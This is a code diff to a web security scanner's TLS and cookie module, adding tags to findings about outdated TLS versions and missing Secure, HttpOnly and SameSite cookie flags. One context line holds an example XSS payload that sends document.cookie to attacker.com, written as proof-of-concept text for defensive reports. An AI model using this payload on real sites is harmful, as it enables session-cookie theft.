@@ -145,6 +145,7 @@ export async function runTLSCookiesModule(ctx: ScanContext): Promise<FindingInpu
           cvss: "7.4",
           cwe: "CWE-326",
           owasp: "A02",
+          tags: ["ssl", "tls"],
           pocCode: `# Verify TLS 1.0 support:\nopenssl s_client -connect ${hostname}:443 -tls1\n# If handshake succeeds, TLS 1.0 is supported`,
           fixExplanation: `Disable TLS 1.0 and 1.1 in your server configuration. For Nginx: ssl_protocols TLSv1.2 TLSv1.3; For Apache: SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1`,
         });
@@ -157,6 +158,7 @@ export async function runTLSCookiesModule(ctx: ScanContext): Promise<FindingInpu
           cvss: "5.4",
           cwe: "CWE-326",
           owasp: "A02",
+          tags: ["ssl", "tls"],
           fixExplanation: "Disable TLS 1.1. For Nginx: ssl_protocols TLSv1.2 TLSv1.3;",
         });
       } else {
@@ -276,6 +278,7 @@ export async function runTLSCookiesModule(ctx: ScanContext): Promise<FindingInpu
         cvss: cookie.isAuthCookie ? "7.4" : "4.3",
         cwe: "CWE-614",
         owasp: "A02",
+        tags: ["cookie", "ssl", "tls", ...(cookie.isAuthCookie ? ["auth-cookie"] : [])],
         fixPatch: `// Express.js:\nres.cookie('${cookie.name}', value, {\n  secure: true,    // ← add this\n  httpOnly: true,\n  sameSite: 'strict'\n});`,
         fixExplanation: `Add the Secure flag to the ${cookie.name} cookie to ensure it is only sent over HTTPS connections.`,
       });
@@ -291,6 +294,7 @@ export async function runTLSCookiesModule(ctx: ScanContext): Promise<FindingInpu
         cvss: cookie.isAuthCookie ? "7.4" : "4.3",
         cwe: "CWE-1004",
         owasp: "A02",
+        tags: ["httponly", "cookie", ...(cookie.isAuthCookie ? ["auth-cookie"] : [])],
         pocCode: `// XSS payload to steal cookie:\ndocument.location='https://attacker.com/steal?c='+document.cookie;`,
         fixExplanation: `Add HttpOnly to the ${cookie.name} cookie. HttpOnly prevents JavaScript from accessing the cookie, blocking XSS-based session theft.`,
       });
@@ -306,6 +310,7 @@ export async function runTLSCookiesModule(ctx: ScanContext): Promise<FindingInpu
         cvss: cookie.isAuthCookie ? "6.8" : "4.3",
         cwe: "CWE-352",
         owasp: "A01",
+        tags: ["cookie", "csrf"],
         fixPatch: `res.cookie('${cookie.name}', value, { sameSite: 'strict' }); // or 'lax' for OAuth flows`,
         fixExplanation: "Set SameSite=Strict for session cookies to block cross-site submission entirely. Use SameSite=Lax if you need cookies on top-level navigations (OAuth flows). Only use SameSite=None with Secure flag for legitimate cross-site use cases.",
       });
